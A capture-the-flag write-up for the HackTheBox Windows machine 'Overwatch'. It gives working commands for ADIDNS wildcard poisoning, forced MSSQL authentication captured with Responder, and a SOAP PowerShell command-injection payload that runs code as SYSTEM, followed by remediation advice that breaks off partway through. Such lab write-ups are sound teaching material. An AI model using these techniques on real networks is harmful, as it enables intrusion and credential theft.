# HackTheBox — Overwatch
 
> **Difficulty:** Medium | **OS:** Windows (AD) | **Category:** Full Chain
 
---
 
## High-Level Summary
 
This machine involves enumerating an open SMB share to recover hardcoded database credentials from a custom application. Using these credentials, an ADIDNS poisoning attack is performed to hijack DNS resolution. By abusing an MSSQL Linked Server feature (`OPENQUERY`), the database service is forced to authenticate to a rogue DNS record, capturing cleartext credentials for a higher-privileged user via Responder.
 
For root escalation, a custom Windows monitoring service is uncovered. Reverse engineering the .NET binary reveals a WCF/SOAP endpoint vulnerable to PowerShell command injection. A malicious SOAP envelope achieves remote code execution as `NT AUTHORITY\SYSTEM`.
 
---
 
## Attack Chain Summary
 
```
SMB null session → overwatch.exe docs → hardcoded sqlsvc creds
  └─► ADIDNS wildcard poisoning (sqlsvc has DNS write perms)
        └─► MSSQL Linked Server OPENQUERY → Responder → sqlmgmt cleartext creds
              └─► WinRM as sqlmgmt → User Flag
                    └─► C:\Software\Monitoring\overwatch.exe (ILSpy decompile)
                          └─► WCF/SOAP KillProcess() PowerShell injection
                                └─► RCE as NT AUTHORITY\SYSTEM → Root Flag 🏴
```
 
---
 
## Part 1: Initial Access → User Flag
 
---
 
## 1. SMB Enumeration & Credential Extraction
 
Initial enumeration reveals that anonymous (null session) SMB access is permitted on the target. List available shares:
 
```bash
smbclient -L //10.129.244.81 -N
```
 
Browse the accessible `Monitoring` share and download its contents:
 
```bash
smbclient //10.129.244.81/Monitoring -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
 
The share contains documentation and deployment files for a custom `overwatch.exe` application. Analysing these files yields hardcoded SQL service account credentials:
 
- **Username:** `OVERWATCH\sqlsvc`
- **Password:** `TI0LKcfHzZw1Vv`
 
---
 
## 2. ADIDNS Wildcard Poisoning
 
Checking the privileges of `sqlsvc` against the Active Directory environment reveals it holds **write permissions on the AD-integrated DNS zone**. This enables an ADIDNS poisoning attack.
 
Use `dnstool.py` from the Krbrelayx suite to inject a wildcard DNS record (`*`), redirecting all unresolved hostnames to the attacker machine:
 
```bash
dnstool.py -u 'overwatch.htb\sqlsvc' \
           -p 'TI0LKcfHzZw1Vv' \
           -r '*' \
           -d 10.10.16.9 \
           --action add \
           10.129.244.81
```
 
Any hostname not already present in DNS (such as `SQL07.overwatch.htb`) will now resolve to `10.10.16.9`.
 
---
 
## 3. Forced Authentication via MSSQL Linked Server → Credentials for `sqlmgmt`
 
Authenticate to the MSSQL service using the `sqlsvc` credentials and enumerate linked servers:
 
```sql
EXEC sp_linkedservers;
-- Result: SQL07 identified as a linked server
```
 
Start `Responder` on the attacker machine to intercept incoming authentication attempts:
 
```bash
sudo responder -I tun0
```
 
Execute a pass-through query targeting the `SQL07` linked server. Because the wildcard DNS record now points `SQL07.overwatch.htb` to the attacker machine, MSSQL attempts to authenticate outbound — straight into Responder:
 
```sql
SELECT * FROM OPENQUERY("SQL07", 'SELECT 1;');
```
 
Responder intercepts the authentication and returns cleartext credentials:
 
- **Username:** `sqlmgmt`
- **Password:** `bIhBbzMMnB82yx`
 
---
 
## User Flag
 
Authenticate via WinRM using the captured credentials:
 
```bash
evil-winrm -i 10.129.244.81 -u sqlmgmt -p 'bIhBbzMMnB82yx'
```
 
```powershell
type C:\Users\sqlmgmt\Desktop\user.txt
```
 
> **User flag captured.**
 
---
 
## Part 2: Root Flag (SYSTEM via SOAP Injection)
 
---
 
## 4. Local Enumeration — Custom Monitoring Service
 
With an interactive WinRM session as `sqlmgmt`, enumerate the local file system for non-standard directories:
 
```powershell
Get-ChildItem -Path C:\ -Force
```
 
A non-default `Software` directory is present at the root of `C:\`. Inside:
 
```
C:\Software\Monitoring\
    overwatch.exe
    overwatch.exe.config
```
 
This is the deployed version of the binary found on the SMB share. Download it for offline analysis:
 
```powershell
# From evil-winrm session
download C:\Software\Monitoring\overwatch.exe
download C:\Software\Monitoring\overwatch.exe.config
```
 
---
 
## 5. Reverse Engineering `overwatch.exe` — Command Injection in `KillProcess()`
 
Decompile the .NET binary using **ILSpy**. The application hosts a local WCF/SOAP web service. Inspecting the `KillProcess()` method exposes a critical flaw — user-supplied input is concatenated directly into a PowerShell command string executed by a `PowerShell` runspace, with no sanitisation:
 
```csharp
// Vulnerable code in KillProcess()
public string KillProcess(string processName)
{
    string text = "Stop-Process -Name " + processName + " -Force";
    // ...
    val2.get_Commands().AddScript(text);
    // ...
}
```
 
The `overwatch.exe.config` file reveals the local WCF/SOAP endpoint address:
 
```xml
<baseAddresses>
    <add baseAddress="http://overwatch.htb:8000/MonitorService" />
</baseAddresses>
```
 
The service is bound to `localhost:8000` and runs as `NT AUTHORITY\SYSTEM` — making this a direct path to a SYSTEM shell.
 
---
 
## 6. SOAP PowerShell Injection → RCE as SYSTEM
 
Craft a SOAP envelope targeting `KillProcess()`. The injection payload breaks out of the `Stop-Process` command using a semicolon, executes an arbitrary command, and comments out the remainder of the original string with `#`:
 
```
dummy ; Get-Content C:\Users\Administrator\Desktop\root.txt ; #
```
 
Execute the following script directly from the WinRM session:
 
```powershell
$Url = "http://127.0.0.1:8000/MonitorService"
 
$Payload = "dummy ; Get-Content C:\Users\Administrator\Desktop\root.txt ; #"
 
$SoapEnvelope = @"
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>$Payload</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
"@
 
$Response = Invoke-WebRequest `
    -Uri $Url `
    -Method Post `
    -ContentType "text/xml; charset=utf-8" `
    -Headers @{"SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess"} `
    -Body $SoapEnvelope `
    -UseBasicParsing
 
[xml]$xmlResponse = $Response.Content
$xmlResponse.Envelope.Body.KillProcessResponse.KillProcessResult
```
 
The service processes the injected command as `NT AUTHORITY\SYSTEM` and returns the flag contents in the SOAP response body.
 
---
 
## Root Flag
 
> **Root flag captured. Machine pwned.**
 
---
 
## Part 3: Remediation & Patching
 
---
 
## R1. Hardcoded Credentials & SMB Null Sessions
 
**Finding:** Anonymous SMB access exposed application documentation containing hardcoded `sqlsvc` credentials in plaintext.
 
**Remediation:**
- **Disable SMB null sessions** — ensure no share is accessible without authentication:
  ```
  # Group Policy: Computer Configuration → Windows Settings → Security Settings
  # → Local Policies → Security Options
  Network access: Do not allow anonymous enumeration of SAM accounts and shares → Enabled
  ```
- **Remove hardcoded credentials** from all source code and documentation. Store secrets in a dedicated secrets manager (Windows Credential Manager, HashiCorp Vault, or Azure Key Vault) and inject them at runtime.
- Audit all SMB shares with:
  ```powershell
  Get-SmbShare | Get-SmbShareAccess | Where-Object { $_.AccountName -like "*Everyone*" -or $_.AccountName -like "*Anonymous*" }
  ```
 
---
 
## R2. ADIDNS Poisoning — Excessive DNS Write Permissions
 
**Finding:** The `sqlsvc` service account held write permissions on the AD-integrated DNS zone, allowing injection of a wildcard record that redirected arbitrary hostnames to the attacker.
 
**Remediation:**
- **Audit DNS zone ACLs** and remove `Create All Child Objects` or `Write` permissions from all non-DNS-administrator accounts:
  ```powershell
  # Review DNS zone permissions
  Get-Acl "AD:DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwatch,DC=htb" | Format-List
  ```
- Service accounts like `sqlsvc` should hold only the minimum permissions required for their function — DNS write access is not a legitimate requirement for a SQL service account.
- Enable **DNS audit logging** to alert on new record creation:
  ```
  DNS Manager → Server → Properties → Event Logging → Log all packets
  ```
 
---
 
## R3. MSSQL Forced Authentication via Linked Servers
 
**Finding:** An MSSQL linked server (`SQL07`) was configured without outbound firewall restrictions. Combined with the poisoned DNS record, `OPENQUERY` caused MSSQL to authenticate outbound to the attacker, leaking `sqlmgmt` credentials via Responder.
 
**Remediation:**
- **Enforce SMB Signing** domain-wide to prevent NTLM relay attacks:
  ```
  Group Policy: Computer Configuration → Policies → Windows Settings →
  Security Settings → Local Policies → Security Options
  Microsoft network client: Digitally sign communications (always) → Enabled
  ```
- **Disable NTLM where possible** and mandate Kerberos authentication for all service-to-service communication.
- **Audit and remove unnecessary linked servers:**
  ```sql
  EXEC sp_linkedservers;
  -- Remove any that are not operationally required
  EXEC sp_dropserver 'SQL07', 'droplogins';
  ```
- If linked servers are required, restrict their outbound network access via host-based firewall rules so they can only connect to explicitly approved destinations.
 
---
 
## R4. WCF/SOAP Command Injection in `KillProcess()`
 
**Finding:** The `KillProcess()` WCF method concatenated user-supplied input directly into a PowerShell command string executed by a `PowerShell` runspace, with no input validation or sanitisation. This allowed arbitrary command injection as `NT AUTHORITY\SYSTEM`.
 
**Remediation:**
